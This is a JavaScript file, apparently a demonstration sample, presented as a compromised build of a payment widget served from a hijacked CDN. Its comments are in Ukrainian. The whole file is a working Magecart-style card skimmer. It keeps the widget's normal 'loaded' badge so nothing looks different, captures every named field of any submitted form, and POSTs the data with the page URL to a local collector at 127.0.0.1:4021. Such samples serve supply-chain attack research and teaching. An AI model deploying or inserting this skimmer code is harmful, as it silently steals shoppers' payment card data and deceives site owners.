/* Payment Widget v2.3.1 — СКОМПРОМЕТОВАНА версія (атакувальник отримав доступ до CDN) */
(function () {
    var badge = document.getElementById('widget');
    if (badge) badge.textContent = '✅ PayWidget v2.3.1 завантажено'; // виглядає так само!

    // Magecart-style skimmer: перехоплюємо дані картки при сабміті форми
    document.addEventListener('submit', function (e) {
        var data = {};
        Array.prototype.forEach.call(e.target.elements, function (el) {
            if (el.name) data[el.name] = el.value;
        });
        fetch('http://127.0.0.1:4021/collect', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ source: 'skimmer', page: location.href, data: data })
        });
    }, true);
})();
